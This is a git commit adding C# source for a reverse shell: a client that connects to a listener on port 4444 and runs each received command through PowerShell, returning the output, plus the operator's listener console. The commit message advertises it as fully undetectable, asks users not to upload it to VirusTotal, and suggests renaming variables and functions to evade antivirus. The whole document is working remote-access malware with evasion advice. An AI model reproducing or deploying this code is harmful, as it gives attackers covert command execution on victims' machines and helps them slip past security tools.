777ff03ac5153d91a8e1b655b6080b6cc1bd7752
PepeTheRital <65770864+PepeTheRital@users.noreply.github.com>
2021-02-02 01:01:18 +0100

    Source Code
    Version : 1.0
    
    Is very very basic reverse shell in C#. I can update this in future.
    
    It's 100%FUD, please don't upload in virustotal. 
    
    If it's spotted by AV you can :
    - Rename variable/function
    - Change function, but with same output
    ....

---
+++ SocketProjetClient/Program.cs
@@ -0,0 +1,131 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Diagnostics;
+
+namespace SocketProjetClient
+{
+    class Program
+    {
+        public static int Main(string[] args)
+        {
+
+            StartClient();
+            return 0;
+
+        }
+
+        private static void StartClient()
+        {
+            byte[] bytes = new byte[1024];
+
+            try
+            {
+                //Connection au serveur a distance
+                string ip_server = "127.0.0.1";
+                int port_server = 4444;
+
+                IPHostEntry host = Dns.GetHostEntry(ip_server);
+                IPAddress ipAddress = host.AddressList[0];
+                IPEndPoint remoteEP = new IPEndPoint(ipAddress, port_server);
+
+                //Creation du socket TCP
+                Socket envoie = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+
+                //Connection au serveur distant
+                envoie.Connect(remoteEP); //Connection au server
+                Console.WriteLine("Connecter a {0}", envoie.RemoteEndPoint.ToString());
+
+                try
+                {
+                    while (true)
+                    {
+
+
+                        //Recoie la donnee du serveur 
+                        //La commande cmd qui sera execute
+                        int octetRecue = envoie.Receive(bytes);
+                        string cmd_exec = Encoding.ASCII.GetString(bytes, 0, octetRecue);//cmd_exec contiendra la commande a executer
+                        Console.WriteLine(cmd_exec);
+
+                        if (cmd_exec == "kill")//Si la commande kill est envoye le programme stop
+                        {
+                            //
+                            //Envoie kill au serveur pour fermer la connection, puis ferme la connection
+                            //
+
+                            byte[] message = Encoding.ASCII.GetBytes("kill");
+
+                            //Envoie la donne dans le socket
+                            int octetEnvoie = envoie.Send(message);
+
+                            //Fermeture du socket
+                            envoie.Shutdown(SocketShutdown.Both);
+                            envoie.Close();
+                            break;
+                        }
+                        else
+                        {
+
+                            //La variable res_command a le resultat de la commande cmd
+                            string res_command = null;
+                            res_command = cmd_command(cmd_exec);
+                            Console.WriteLine(res_command);
+
+                            //Encode la donne dans un tableau en octet
+                            byte[] message = Encoding.ASCII.GetBytes(res_command);
+
+                            //Envoie la donne dans le socket
+                            int octetEnvoie = envoie.Send(message);
+
+
+                        }
+                    }
+
+
+                }
+
+                catch (ArgumentNullException ane)
+                {
+                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
+                }
+
+                catch (SocketException se)
+                {
+                    Console.WriteLine("SocketException : {0}", se.ToString());
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
+
+        private static string cmd_command(string cmd_exec)
+        {
+            //Demarrage du process CMD
+            Process cmd = new Process();
+            cmd.StartInfo.FileName = "powershell.exe";
+            cmd.StartInfo.Arguments = cmd_exec;
+            cmd.StartInfo.UseShellExecute = false;
+            cmd.StartInfo.RedirectStandardOutput = true;
+            cmd.Start();
+
+
+            StreamReader reader = cmd.StandardOutput;
+            string output = reader.ReadToEnd();
+            cmd.WaitForExit();
+            //Envoie le resultat de la commande
+            return output;
+
+
+        }
+    }
+}
---
+++ SocketProjetFrame/Program.cs
@@ -0,0 +1,99 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace SocketProjetFrame
+{
+    class Program
+    {
+        public static int Main(string[] args)
+        {
+            StartServer();
+            return 0;
+        }
+
+        public static void StartServer()
+        {
+            string ip_listener = "127.0.0.1";
+            int port_listener = 4444;
+
+            IPHostEntry host = Dns.GetHostEntry(ip_listener);
+            IPAddress ipAddress = host.AddressList[0];
+            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port_listener);
+
+            try
+            {
+                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);//Creation du socket avec protocole TCP
+                listener.Bind(localEndPoint);//Demarrage du socket
+                listener.Listen(10);//Au bout de 10 requetes consécutif, le listener répondra occupé
+
+                Console.WriteLine("Rerverse shell par PepeTheRital");
+                Console.WriteLine("IP d'ecoute : " + ip_listener);
+                Console.WriteLine("Port d'écoute: " + port_listener);
+                Console.WriteLine("----------------------------------");
+
+                Socket handler = listener.Accept();
+
+                Console.WriteLine("Connecter a {0}", handler.RemoteEndPoint.ToString());
+                Console.WriteLine("----------------------------------");
+
+                //Variable pour recepetion des données
+                string data_client = null;
+                string send_commmand = null;
+                byte[] bytes = null;
+
+                while (true)
+                {
+                    //Envoie de la commande
+
+                    send_commmand = Console.ReadLine();
+                    byte[] message = Encoding.ASCII.GetBytes(send_commmand);
+                    handler.Send(message);
+
+                    //Recepetion de la donnée de la donne, puis la depose dans la variable (string) data_client
+                    bytes = new byte[1024];
+                    int bytesRec = handler.Receive(bytes);
+                    data_client += Encoding.ASCII.GetString(bytes, 0, bytesRec);
+
+                    if (data_client.IndexOf("kill") > -1)//Si il recoit kill la connection stop
+                    {
+                        break;
+                    }
+
+                 
+                    else
+                    {
+                        Console.WriteLine("powershell > {0}", send_commmand);
+                        Console.WriteLine(data_client);
+                        Console.WriteLine("----------------------------------");
+
+                        data_client = "";
+                    }
+                }
+
+               
+
+                //Fermeture du socket
+                handler.Shutdown(SocketShutdown.Both);
+                handler.Close();
+            }
+
+            catch (Exception e)
+            {
+                Console.WriteLine("error");
+                Console.WriteLine(e.ToString());
+            }
+
+            Console.WriteLine("Appuyer sur une touche pour continuer");
+            Console.ReadKey();
+
+
+        }
+    }
+}
